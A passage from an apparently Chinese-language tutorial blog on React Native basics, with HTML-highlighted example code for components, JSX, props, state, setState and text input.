class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> React, &#123; Component &#125; <span class=\"keyword\">from</span> <span class=\"string\">'react'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; Text &#125; <span class=\"keyword\">from</span> <span class=\"string\">'react-native'</span>;</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Cat</span> <span class=\"keyword\">extends</span> <span class=\"title\">Component</span> </span>&#123;</span><br><span class=\"line\">  render() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (</span><br><span class=\"line\">      &lt;Text&gt;Hello, I am your cat!&lt;/Text&gt;</span><br><span class=\"line\">    );</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这两种不同的组件之间的<strong>本质区别就是</strong>：有无state属性 和 生命周期函数！</p>\n<h3 id=\"JSX\"><a href=\"#JSX\" class=\"headerlink\" title=\"JSX\"></a>JSX</h3><figure class=\"highlight jsx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> React <span class=\"keyword\">from</span> <span class=\"string\">'react'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; Text &#125; <span class=\"keyword\">from</span> <span class=\"string\">'react-native'</span>;</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Cat</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getFullName</span>(<span class=\"params\">firstName, secondName, thirdName</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> firstName + <span class=\"string\">\" \"</span> + secondName + <span class=\"string\">\" \"</span> + thirdName;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> (</span><br><span class=\"line\">    &lt;Text&gt;</span><br><span class=\"line\">      Hello, I am &#123;getFullName(<span class=\"string\">\"Rum\"</span>, <span class=\"string\">\"Tum\"</span>, <span class=\"string\">\"Tugger\"</span>)&#125;!</span><br><span class=\"line\">    &lt;<span class=\"regexp\">/Text&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">  );</span></span><br><span class=\"line\"><span class=\"regexp\">&#125;</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"自定义组件\"><a href=\"#自定义组件\" class=\"headerlink\" title=\"自定义组件\"></a>自定义组件</h3><figure class=\"highlight jsx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> React, &#123; Component &#125; <span class=\"keyword\">from</span> <span class=\"string\">\"react\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; Button, Text, View &#125; <span class=\"keyword\">from</span> <span class=\"string\">\"react-native\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Cat</span> <span class=\"keyword\">extends</span> <span class=\"title\">Component</span> </span>&#123;</span><br><span class=\"line\">  state = &#123; <span class=\"attr\">isHungry</span>: <span class=\"literal\">true</span> &#125;;</span><br><span class=\"line\">  render(props) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (</span><br><span class=\"line\">      &lt;View&gt;</span><br><span class=\"line\">        &lt;Text&gt;</span><br><span class=\"line\">          I am &#123;<span class=\"keyword\">this</span>.props.name&#125;, and I am</span><br><span class=\"line\">          &#123;<span class=\"keyword\">this</span>.state.isHungry ? <span class=\"string\">\" hungry\"</span> : <span class=\"string\">\" full\"</span>&#125;!</span><br><span class=\"line\">        &lt;<span class=\"regexp\">/Text&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">        &lt;Button</span></span><br><span class=\"line\"><span class=\"regexp\">          onPress=&#123;() =&gt; &#123;</span></span><br><span class=\"line\"><span class=\"regexp\">            this.setState(&#123; isHungry: false &#125;);</span></span><br><span class=\"line\"><span class=\"regexp\">          &#125;&#125;</span></span><br><span class=\"line\"><span class=\"regexp\">          disabled=&#123;!this.state.isHungry&#125;</span></span><br><span class=\"line\"><span class=\"regexp\">          title=&#123;</span></span><br><span class=\"line\"><span class=\"regexp\">            this.state.isHungry ? \"Pour me some milk, please!\" : \"Thank you!\"</span></span><br><span class=\"line\"><span class=\"regexp\">          &#125;</span></span><br><span class=\"line\"><span class=\"regexp\">        /</span>&gt;</span><br><span class=\"line\">      &lt;<span class=\"regexp\">/View&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">    );</span></span><br><span class=\"line\"><span class=\"regexp\">  &#125;</span></span><br><span class=\"line\"><span class=\"regexp\">&#125;</span></span><br><span class=\"line\"><span class=\"regexp\">export default class Cafe extends Component &#123;</span></span><br><span class=\"line\"><span class=\"regexp\">  render() &#123;</span></span><br><span class=\"line\"><span class=\"regexp\">    return (</span></span><br><span class=\"line\"><span class=\"regexp\">      &lt;&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">        &lt;Cat name=\"Munkustrap\" /</span>&gt;</span><br><span class=\"line\">        &lt;Cat name=<span class=\"string\">\"Spot\"</span> /&gt;</span><br><span class=\"line\">      &lt;<span class=\"regexp\">/&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">    );</span></span><br><span class=\"line\"><span class=\"regexp\">  &#125;</span></span><br><span class=\"line\"><span class=\"regexp\">&#125;</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"props\"><a href=\"#props\" class=\"headerlink\" title=\"props\"></a>props</h3><p><strong>类似于vue的父子组件传值</strong></p>\n<figure class=\"highlight jsx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> React <span class=\"keyword\">from</span> <span class=\"string\">'react'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; Text, View &#125; <span class=\"keyword\">from</span> <span class=\"string\">'react-native'</span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Cat</span>(<span class=\"params\">props</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> (</span><br><span class=\"line\">    &lt;View&gt;</span><br><span class=\"line\">      &lt;Text&gt;Hello, I am &#123;props.name&#125;!&lt;/Text&gt;</span><br><span class=\"line\">    &lt;<span class=\"regexp\">/View&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">  );</span></span><br><span class=\"line\"><span class=\"regexp\">&#125;</span></span><br><span class=\"line\"><span class=\"regexp\">export default function Cafe() &#123;</span></span><br><span class=\"line\"><span class=\"regexp\">  return (</span></span><br><span class=\"line\"><span class=\"regexp\">    &lt;View&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">      &lt;Cat name=\"Maru\" /</span>&gt;</span><br><span class=\"line\">      &lt;Cat name=<span class=\"string\">\"Jellylorum\"</span> /&gt;</span><br><span class=\"line\">      &lt;Cat name=<span class=\"string\">\"Spot\"</span> /&gt;</span><br><span class=\"line\">    &lt;<span class=\"regexp\">/View&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">  );</span></span><br><span class=\"line\"><span class=\"regexp\">&#125;</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"state\"><a href=\"#state\" class=\"headerlink\" title=\"state\"></a>state</h3><p><strong>类似于vue data对象</strong></p>\n<p><code>useState</code>：</p>\n<p><code>[&lt;getter&gt;, &lt;setter&gt;] = useState(&lt;initialValue&gt;)</code>。</p>\n<p>在函数组件中调用<code>useState</code>，就会创建一个单独的状态。</p>\n<p>在类组件中，<code>state</code> 总是一个对象，可以在该对象上添加保存属性。</p>\n<p>每次调用<code>useState</code>都会创建一个<code>state</code>块，其中包含一个值。</p>\n<figure class=\"highlight jsx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> React, &#123; useState &#125; <span class=\"keyword\">from</span> <span class=\"string\">\"react\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; Button, Text, View &#125; <span class=\"keyword\">from</span> <span class=\"string\">\"react-native\"</span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Cat</span>(<span class=\"params\">props</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">// 创建一个状态，并将其初始化为“true”</span></span><br><span class=\"line\">  <span class=\"keyword\">const</span> [isHungry, setIsHungry] = useState(<span class=\"literal\">true</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> (</span><br><span class=\"line\">    &lt;View&gt;</span><br><span class=\"line\">      &lt;Text&gt;</span><br><span class=\"line\">        I am &#123;props.name&#125;, and I am &#123;isHungry ? <span class=\"string\">\"hungry\"</span> : <span class=\"string\">\"full\"</span>&#125;!</span><br><span class=\"line\">      &lt;<span class=\"regexp\">/Text&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">      &lt;Button</span></span><br><span class=\"line\"><span class=\"regexp\">        onPress=&#123;() =&gt; &#123;</span></span><br><span class=\"line\"><span class=\"regexp\">          setIsHungry(false);</span></span><br><span class=\"line\"><span class=\"regexp\">        &#125;&#125;</span></span><br><span class=\"line\"><span class=\"regexp\">        disabled=&#123;!isHungry&#125;</span></span><br><span class=\"line\"><span class=\"regexp\">        title=&#123;isHungry ? \"Pour me some milk, please!\" : \"Thank you!\"&#125;</span></span><br><span class=\"line\"><span class=\"regexp\">      /</span>&gt;</span><br><span class=\"line\">    &lt;<span class=\"regexp\">/View&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">  );</span></span><br><span class=\"line\"><span class=\"regexp\">&#125;</span></span><br><span class=\"line\"><span class=\"regexp\">export default function Cafe() &#123;</span></span><br><span class=\"line\"><span class=\"regexp\">  return (</span></span><br><span class=\"line\"><span class=\"regexp\">    &lt;&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">      &lt;Cat name=\"Munkustrap\" /</span>&gt;</span><br><span class=\"line\">      &lt;Cat name=<span class=\"string\">\"Spot\"</span> /&gt;</span><br><span class=\"line\">    &lt;<span class=\"regexp\">/&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">  );</span></span><br><span class=\"line\"><span class=\"regexp\">&#125;</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight jsx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> React, &#123; Component &#125; <span class=\"keyword\">from</span> <span class=\"string\">\"react\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; Button, Text, View &#125; <span class=\"keyword\">from</span> <span class=\"string\">\"react-native\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Cat</span> <span class=\"keyword\">extends</span> <span class=\"title\">Component</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">// 声明状态</span></span><br><span class=\"line\">  state = &#123; <span class=\"attr\">isHungry</span>: <span class=\"literal\">true</span> &#125;;</span><br><span class=\"line\">  render(props) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (</span><br><span class=\"line\">      &lt;View&gt;</span><br><span class=\"line\">        &lt;Text&gt;</span><br><span class=\"line\">          I am &#123;<span class=\"keyword\">this</span>.props.name&#125;, and I am</span><br><span class=\"line\">          &#123;<span class=\"keyword\">this</span>.state.isHungry ? <span class=\"string\">\" hungry\"</span> : <span class=\"string\">\" full\"</span>&#125;!</span><br><span class=\"line\">        &lt;<span class=\"regexp\">/Text&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">        &lt;Button</span></span><br><span class=\"line\"><span class=\"regexp\">          onPress=&#123;() =&gt; &#123;</span></span><br><span class=\"line\"><span class=\"regexp\">            &#123;/</span>* 通过 setState 改变状态 *<span class=\"regexp\">/&#125;</span></span><br><span class=\"line\"><span class=\"regexp\">            this.setState(&#123; isHungry: false &#125;);</span></span><br><span class=\"line\"><span class=\"regexp\">          &#125;&#125;</span></span><br><span class=\"line\"><span class=\"regexp\">          disabled=&#123;!this.state.isHungry&#125;</span></span><br><span class=\"line\"><span class=\"regexp\">          title=&#123;</span></span><br><span class=\"line\"><span class=\"regexp\">            this.state.isHungry ? \"Pour me some milk, please!\" : \"Thank you!\"</span></span><br><span class=\"line\"><span class=\"regexp\">          &#125;</span></span><br><span class=\"line\"><span class=\"regexp\">        /</span>&gt;</span><br><span class=\"line\">      &lt;<span class=\"regexp\">/View&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">    );</span></span><br><span class=\"line\"><span class=\"regexp\">  &#125;</span></span><br><span class=\"line\"><span class=\"regexp\">&#125;</span></span><br><span class=\"line\"><span class=\"regexp\">export default class Cafe extends Component &#123;</span></span><br><span class=\"line\"><span class=\"regexp\">  render() &#123;</span></span><br><span class=\"line\"><span class=\"regexp\">    return (</span></span><br><span class=\"line\"><span class=\"regexp\">      &lt;&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">        &lt;Cat name=\"Munkustrap\" /</span>&gt;</span><br><span class=\"line\">        &lt;Cat name=<span class=\"string\">\"Spot\"</span> /&gt;</span><br><span class=\"line\">      &lt;<span class=\"regexp\">/&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">    );</span></span><br><span class=\"line\"><span class=\"regexp\">  &#125;</span></span><br><span class=\"line\"><span class=\"regexp\">&#125;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"RN的Props\"><a href=\"#RN的Props\" class=\"headerlink\" title=\"RN的Props\"></a>RN的Props</h2><h3 id=\"原生组件的props\"><a href=\"#原生组件的props\" class=\"headerlink\" title=\"原生组件的props\"></a>原生组件的props</h3><p>以常见的基础组件<code>Image</code>为例，在创建一个图片时，可以传入一个名为<code>source</code>的 prop 来指定要显示的图片的地址，以及使用名为<code>style</code>的 prop 来控制其尺寸。</p>\n<figure class=\"highlight jsx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> React, &#123; Component &#125; <span class=\"keyword\">from</span> <span class=\"string\">'react'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; Image &#125; <span class=\"keyword\">from</span> <span class=\"string\">'react-native'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Bananas</span> <span class=\"keyword\">extends</span> <span class=\"title\">Component</span> </span>&#123;</span><br><span class=\"line\">  render() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> pic = &#123;</span><br><span class=\"line\">      uri: <span class=\"string\">'https://upload.wikimedia.org/wikipedia/commons/d/de/Bananavarieties.jpg'</span></span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (</span><br><span class=\"line\">      &lt;Image source=&#123;pic&#125; style=&#123;&#123;<span class=\"attr\">width</span>: <span class=\"number\">193</span>, <span class=\"attr\">height</span>: <span class=\"number\">110</span>&#125;&#125; /&gt;</span><br><span class=\"line\">    );</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"自定义组件-1\"><a href=\"#自定义组件-1\" class=\"headerlink\" title=\"自定义组件\"></a>自定义组件</h3><figure class=\"highlight jsx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> React, &#123; Component &#125; <span class=\"keyword\">from</span> <span class=\"string\">'react'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; Text, View &#125; <span class=\"keyword\">from</span> <span class=\"string\">'react-native'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Greeting</span> <span class=\"keyword\">extends</span> <span class=\"title\">Component</span> </span>&#123;</span><br><span class=\"line\">  render() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (</span><br><span class=\"line\">      &lt;View style=&#123;&#123;<span class=\"attr\">alignItems</span>: <span class=\"string\">'center'</span>, <span class=\"attr\">marginTop</span>: <span class=\"number\">50</span>&#125;&#125;&gt;</span><br><span class=\"line\">        &#123;<span class=\"comment\">/* Greeting组件中将name作为一个属性来定制 */</span>&#125;</span><br><span class=\"line\">        &lt;Text&gt;Hello &#123;<span class=\"keyword\">this</span>.props.name&#125;!&lt;/Text&gt;</span><br><span class=\"line\">      &lt;<span class=\"regexp\">/View&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">    );</span></span><br><span class=\"line\"><span class=\"regexp\">  &#125;</span></span><br><span class=\"line\"><span class=\"regexp\">&#125;</span></span><br><span class=\"line\"><span class=\"regexp\"></span></span><br><span class=\"line\"><span class=\"regexp\">export default class LotsOfGreetings extends Component &#123;</span></span><br><span class=\"line\"><span class=\"regexp\">  render() &#123;</span></span><br><span class=\"line\"><span class=\"regexp\">    return (</span></span><br><span class=\"line\"><span class=\"regexp\">      &lt;View style=&#123;&#123;alignItems: 'center'&#125;&#125;&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">        &lt;Greeting name='Rexxar' /</span>&gt;</span><br><span class=\"line\">        &lt;Greeting name=<span class=\"string\">'Jaina'</span> /&gt;</span><br><span class=\"line\">        &lt;Greeting name=<span class=\"string\">'Valeera'</span> /&gt;</span><br><span class=\"line\">      &lt;<span class=\"regexp\">/View&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">    );</span></span><br><span class=\"line\"><span class=\"regexp\">  &#125;</span></span><br><span class=\"line\"><span class=\"regexp\">&#125;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"RN中的State\"><a href=\"#RN中的State\" class=\"headerlink\" title=\"RN中的State\"></a>RN中的State</h2><p>一般来说，你需要在class中声明一个<code>state</code>对象，然后在需要修改时调用<code>setState</code>方法。</p>\n<p>假如我们需要制作一段不停闪烁的文字。文字内容本身在组件创建时就已经指定好了，所以文字内容应该是一个<code>prop</code>。而文字的显示或隐藏的状态（快速的显隐切换就产生了闪烁的效果）则是随着时间变化的，因此这一状态应该写到<code>state</code>中。</p>\n<figure class=\"highlight jsx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> React, &#123; Component &#125; <span class=\"keyword\">from</span> <span class=\"string\">'react'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; Text, View &#125; <span class=\"keyword\">from</span> <span class=\"string\">'react-native'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Blink</span> <span class=\"keyword\">extends</span> <span class=\"title\">Component</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">// 声明state对象</span></span><br><span class=\"line\">  state = &#123; <span class=\"attr\">isShowingText</span>: <span class=\"literal\">true</span> &#125;;</span><br><span class=\"line\">  </span><br><span class=\"line\">  componentDidMount() &#123;</span><br><span class=\"line\">    <span class=\"comment\">// 每1000毫秒对showText状态做一次取反操作</span></span><br><span class=\"line\">    setInterval(<span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.setState(&#123;</span><br><span class=\"line\">        isShowingText: !<span class=\"keyword\">this</span>.state.isShowingText</span><br><span class=\"line\">      &#125;);</span><br><span class=\"line\">    &#125;, <span class=\"number\">1000</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  render() &#123;</span><br><span class=\"line\">    <span class=\"comment\">// 根据当前showText的值决定是否显示text内容</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!<span class=\"keyword\">this</span>.state.isShowingText) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> (</span><br><span class=\"line\">      &lt;Text&gt;&#123;<span class=\"keyword\">this</span>.props.text&#125;&lt;<span class=\"regexp\">/Text&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">    );</span></span><br><span class=\"line\"><span class=\"regexp\">  &#125;</span></span><br><span class=\"line\"><span class=\"regexp\">&#125;</span></span><br><span class=\"line\"><span class=\"regexp\"></span></span><br><span class=\"line\"><span class=\"regexp\">export default class BlinkApp extends Component &#123;</span></span><br><span class=\"line\"><span class=\"regexp\">  render() &#123;</span></span><br><span class=\"line\"><span class=\"regexp\">    return (</span></span><br><span class=\"line\"><span class=\"regexp\">      &lt;View&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">        &lt;Blink text='I love to blink' /</span>&gt;</span><br><span class=\"line\">        &lt;Blink text=<span class=\"string\">'Yes blinking is so great'</span> /&gt;</span><br><span class=\"line\">        &lt;Blink text=<span class=\"string\">'Why did they ever take this out of HTML'</span> /&gt;</span><br><span class=\"line\">        &lt;Blink text=<span class=\"string\">'Look at me look at me look at me'</span> /&gt;</span><br><span class=\"line\">      &lt;<span class=\"regexp\">/View&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">    );</span></span><br><span class=\"line\"><span class=\"regexp\">  &#125;</span></span><br><span class=\"line\"><span class=\"regexp\">&#125;</span></span><br></pre></td></tr></table></figure>\n<p>实际开发中，==我们一般不会在定时器函数（setInterval、setTimeout 等）中来操作 state==。典型的场景是在接收到服务器返回的新数据，或者在用户输入数据之后。你也可以使用一些“状态容器”比如<a href=\"http://redux.js.org/index.html\" target=\"_blank\" rel=\"noopener\">Redux</a>来统一管理数据流。</p>\n<ul>\n<li>一切界面变化都是<code>状态state变化</code></li>\n<li><code>state</code>的修改必须通过<code>setState()</code>方法<ul>\n<li>this.state.likes = 100; // 这样的<code>直接赋值修改无效！</code></li>\n<li>setState 是一个 merge 合并操作，只修改指定属性，不影响其他属性</li>\n<li>setState 是<code>异步</code>操作，修改<code>不会马上生效</code></li>\n</ul>\n</li>\n</ul>\n<h2 id=\"处理文本输入\"><a href=\"#处理文本输入\" class=\"headerlink\" title=\"处理文本输入\"></a>处理文本输入</h2><p><a href=\"https://reactnative.cn/docs/textinput#content\" target=\"_blank\" rel=\"noopener\"><code>TextInput</code></a>是一个允许用户输入文本的基础组件。</p>\n<p>它有一个名为<code>onChangeText</code>的属性，此属性接受一个函数，而此函数会在文本变化时被调用。</p>\n<p>另外还有一个名为<code>onSubmitEditing</code>的属性，会在文本被提交后（用户按下软键盘上的提交键）调用。</p>\n<figure class=\"highlight jsx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"comment\">/** 处理文本输入</span></span><br><span class=\"line\"><span class=\"comment\"> \t每输入一个单词就得到一块 🍕 */</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">PizzaTranslator</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> [text, setText] = useState(<span class=\"string\">''</span>);</span><br><span class=\"line\">  <span 